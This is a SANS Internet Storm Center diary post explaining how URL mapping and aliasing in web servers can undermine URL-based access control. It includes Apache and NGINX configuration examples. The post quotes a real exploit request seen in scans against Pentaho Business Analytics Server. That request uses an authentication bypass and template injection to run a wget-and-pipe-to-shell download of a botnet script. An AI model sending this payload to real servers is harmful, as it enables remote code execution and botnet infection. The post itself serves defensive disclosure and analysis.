---
title: Conflicts between URL mapping and URL based access control., (Mon, Nov 24th)
url: https://isc.sans.edu/diary/rss/32518
source: SANS Internet Storm Center, InfoCON: green
date: 2025-11-24
fetch_date: 2025-11-25T03:13:26.609043
---

# Conflicts between URL mapping and URL based access control., (Mon, Nov 24th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/32514)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/dallas-2025/course/application-security-securing-web-apps-api-microservices) | Dallas | Dec 1st - Dec 6th 2025 |

# [Conflicts between URL mapping and URL based access control.](/forums/diary/Conflicts%2Bbetween%2BURL%2Bmapping%2Band%2BURL%2Bbased%2Baccess%2Bcontrol/32518/)

**Published**: 2025-11-24. **Last Updated**: 2025-11-24 16:54:38 UTC
**by** [Johannes Ullrich](https://plus.google.com/101587262224166552564?rel=author) (Version: 1)

[0 comment(s)](/diary/Conflicts%2Bbetween%2BURL%2Bmapping%2Band%2BURL%2Bbased%2Baccess%2Bcontrol/32518/#comments)

We continue to encounter high-profile vulnerabilities related to the use of URL mapping (or "aliases") with URL-based access control. Last week, we wrote about the Oracle Identity Manager vulnerability. I noticed some scans for an older vulnerability with similar roots today:

> /pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23%7BT(java.lang.Runtime).getRuntime().exec('wget%20-qO-%20http%3A%2F%2F[redacted]%2Frondo.pms.sh%7Csh')%7D&mgrDn=a&pwd=a

This request attempts to exploit a vulnerability in Hitachi Vantara Pentaho Business Analytics Server (CVE-2022-43939 and CVE-2022-43769). In this case, the end of the URL (/require.js) bypasses authentication. However, the request is still processed by "ldapTreeNodeChildren", which is vulnerable to a template injection, causing the code to be executed. As last week, it appears that the "Chicago Rapper" Rondo botnet is again exploiting this vulnerability.

However, let's examine the underlying cause of this issue.

For many applications, it makes sense to exempt certain URLs from authentication. For example, help pages, a password reset page, or a customer support contact page may need to be accessible even if the user is not logged in.

Webservers offer a wide range of options to map URLs to files on the web server's file system. For example, for our API, we use this directive in Apache's configuration:

> `RewriteEngine On
> RewriteBase /api
> RewriteRule ^.*$ index.html`

In NGINX, the "Location" directive is often used to map different URLs to specific files. A very common configuration option in NGINX:

> location / {
>     try\_files $uri $uri/ /index.html;
> }

If the actual file is not available, "index.html" will be returned instead of an error page.

None of the examples above is necessarily insecure. However, they must be considered in the context of any access control rules that may be enforced by the application. In particular, Java developers seem to struggle with this issue, possibly due to the complexity of some applications or the use of more application-specific paths in Java applications.

A common problem is also the misuse of regular expressions. For example, mistaking the literal "." for the regex "arbitrary character" wildcard, or missing anchors (^, $) to terminate strings. When reviewing a web server configuration, carefully review any URL remapping instructions and verify that they do not conflict with any assumptions regarding authentication and access control.

--
Johannes B. Ullrich, Ph.D. , Dean of Research, [SANS.edu](https://sans.edu)

Keywords:

[0 comment(s)](/diary/Conflicts%2Bbetween%2BURL%2Bmapping%2Band%2BURL%2Bbased%2Baccess%2Bcontrol/32518/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/dallas-2025/course/application-security-securing-web-apps-api-microservices) | Dallas | Dec 1st - Dec 6th 2025 |

* [previous](/diary/32514)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)